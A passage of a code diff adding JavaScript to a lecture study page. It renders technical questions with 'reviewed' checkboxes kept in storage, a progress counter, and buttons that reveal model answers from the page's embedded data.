+    function updateCounter() {
+      const n = Object.keys(state.reviewed).filter((k) => state.reviewed[k]).length;
+      counterEl.innerHTML = `<b>${n}</b> / ${total} marked reviewed`;
+    }
+
+    data.techQuestions.forEach((tq, idx) => {
+      const wrap = document.createElement("div");
+      wrap.className = "tech-card";
+
+      const row = document.createElement("div");
+      row.className = "tech-q-row";
+
+      const qEl = document.createElement("p");
+      qEl.className = "tech-q";
+      qEl.innerHTML = `<span class="mcq-index">${idx + 1}.</span><span>${inline(tq.q)}</span>`;
+      row.appendChild(qEl);
+
+      const label = document.createElement("label");
+      label.className = "tech-reviewed-label";
+      const cb = document.createElement("input");
+      cb.type = "checkbox";
+      cb.checked = !!state.reviewed[tq.id];
+      cb.addEventListener("change", () => {
+        state.reviewed[tq.id] = cb.checked;
+        storageSet(key, state);
+        updateCounter();
+      });
+      label.appendChild(cb);
+      label.appendChild(document.createTextNode("reviewed"));
+      row.appendChild(label);
+
+      wrap.appendChild(row);
+
+      const revealBtn = document.createElement("button");
+      revealBtn.className = "btn reveal-btn";
+      revealBtn.textContent = "Reveal model answer";
+
+      const answerEl = document.createElement("div");
+      answerEl.className = "tech-answer";
+      answerEl.innerHTML = renderMarkdown(tq.answer);
+
+      revealBtn.addEventListener("click", () => {
+        const showing = answerEl.classList.toggle("show");
+        revealBtn.textContent = showing ? "Hide model answer" : "Reveal model answer";
+      });
+
+      wrap.appendChild(revealBtn);
+      wrap.appendChild(answerEl);
+      list.appendChild(wrap);
+    });
+
+    updateCounter();
+  }
+
+  /* ---------------- boot ---------------- */
+
+  document.addEventListener("DOMContentLoaded", () => {
+    const dataEl = document.getElementById("lecture-data");
+    if (!dataEl) return;
+    const data = JSON.parse(dataEl.textContent);
+    initTabs();
+    renderContent(data);
+    initQuiz(data);
+    initTech(data);
+  });
+})();
+
+</script>
+</body>
+</html>
